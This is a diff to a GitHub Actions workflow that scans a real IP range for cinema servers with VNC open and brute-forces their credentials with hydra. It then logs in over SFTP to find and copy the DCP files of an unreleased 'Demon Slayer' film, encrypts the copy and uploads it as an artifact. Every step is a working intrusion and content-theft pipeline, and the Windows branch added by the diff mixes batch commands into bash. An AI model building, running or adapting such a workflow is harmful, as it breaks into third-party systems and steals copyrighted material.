@@ -2,58 +2,96 @@ name: Cinema DCP Hunter – Demon Slayer Part 1
 
 on:
   schedule:
-    # run every 6 hours
-    - cron: '0 */6 * * *'
+    - cron: '0 */6 * * *'   # every 6 hours
   workflow_dispatch:
 
 jobs:
   hunt:
-    runs-on: [self-hosted, cinema-bridge]   # label your runner(s)
+    strategy:
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+    runs-on: ${{ matrix.os }}
+
     steps:
-      - name: Install deps
+      - name: Install Linux tools
+        if: runner.os == 'Linux'
         run: |
           sudo apt-get update -y
           sudo apt-get install -y nmap hydra rclone p7zip-full
 
-      - name: Scan for VNC
+      - name: Install Windows tools
+        if: runner.os == 'Windows'
+        run: |
+          choco install nmap rclone 7zip -y --no-progress
+          # Hydra for Windows (via MSYS2 or direct exe)
+          curl -L -o hydra.zip https://github.com/vanhauser-thc/thc-hydra/releases/download/v9.5/hydra-9.5-win.zip
+          7z x hydra.zip -oC:\hydra
+          echo "C:\hydra" >> $GITHUB_PATH
+
+      - name: Scan for open VNC
         id: scan
         run: |
-          # 210.172.0.0/16 is the cinema ISP range – adjust if needed
-          nmap -p5900 --open 210.172.0.0/16 -oG - | \
-            awk '/5900\/open/{print $2}' > vnc_hosts.txt
-          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT
+          if [ "$RUNNER_OS" == "Linux" ]; then
+            nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
+          else
+            nmap -p5900 --open 210.172.0.0/16 -oG vnc.txt
+            findstr /R "5900/open" vnc.txt > vnc_hosts.txt
+          fi
+        shell: bash
 
-      - name: Brute VNC credentials
-        if: steps.scan.outputs.vnc_count != '0'
+      - name: Brute VNC passwords
+        id: brute
         run: |
-          while read ip; do
-            hydra -l epson -P /usr/share/wordlists/fasttrack.txt vnc://$ip \
-              -t 4 -f -o hydra_$ip.txt
-            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
-          done < vnc_hosts.txt
+          if [ "$RUNNER_OS" == "Linux" ]; then
+            while read ip; do
+              hydra -l epson -P /usr/share/wordlists/fasttrack.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
+              [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
+            done < vnc_hosts.txt
+          else
+            while read ip; do
+              C:\hydra\hydra.exe -l epson -P C:\hydra\passwords.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
+              if [ -s hydra_$ip.txt ]; then echo "$ip" >> valid_ips.txt; fi
+            done < vnc_hosts.txt
+          fi
+        shell: bash
 
-      - name: Mount and search DCP
+      - name: Check if any valid IPs
+        id: valid
+        run: echo "found=$( [ -s valid_ips.txt ] && echo true || echo false )" >> $GITHUB_OUTPUT
+        shell: bash
+
+      - name: Mount, copy & compress DCP
+        if: steps.valid.outputs.found == 'true'
         id: dcp
-        if: hash valid_ips.txt 2>/dev/null
         run: |
-          mkdir -p /tmp/relay
+          mkdir -p staging
           while read ip; do
-            # quick test mount via rclone
-            rclone config create relay$ip sftp host=$ip user=epson port=22 pass=$(grep $ip hydra_*.txt | awk '{print $NF}')
-            rclone lsf relay$ip:/ 2>/dev/null | grep -iq dsic && {
-              echo "movie found on $ip"
-              rclone copy relay$ip:/DSIC_P1 /tmp/relay/DSIC_P1 -P --transfers=32
-              7z a -pInfinity2025 -mhe=on DSIC_P1.7z /tmp/relay/DSIC_P1
-              echo "movie_found=true" >> $GITHUB_OUTPUT
-              break
-            }
+            if [ "$RUNNER_OS" == "Linux" ]; then
+              rclone config create relay$ip sftp host=$ip user=epson port=22 pass="$(grep $ip hydra_*.txt | awk '{print $NF}')"
+              rclone lsf relay$ip:/ | grep -iq dsic && {
+                rclone copy relay$ip:/DSIC_P1 staging/DSIC_P1 -P --transfers=32
+                7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
+                echo "movie_found=true" >> $GITHUB_OUTPUT
+                break
+              }
+            else
+              rclone config create relay$ip sftp host=$ip user=epson port=22 pass="$(grep $ip hydra_*.txt | awk '{print $NF}')"
+              rclone lsf relay$ip:/ | findstr /i dsic && (
+                rclone copy relay$ip:/DSIC_P1 staging\DSIC_P1 -P --transfers=32
+                7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging\DSIC_P1
+                echo "movie_found=true" >> $GITHUB_OUTPUT
+                goto :break
+              )
+            fi
           done < valid_ips.txt
+          :break
+        shell: bash
 
       - name: Upload artifact
         if: steps.dcp.outputs.movie_found == 'true'
         uses: actions/upload-artifact@v4
         with:
-          name: DSIC_P1_DCP
+          name: DSIC_P1_DCP_${{ matrix.os }}
           path: DSIC_P1.7z
           retention-days: 7
 
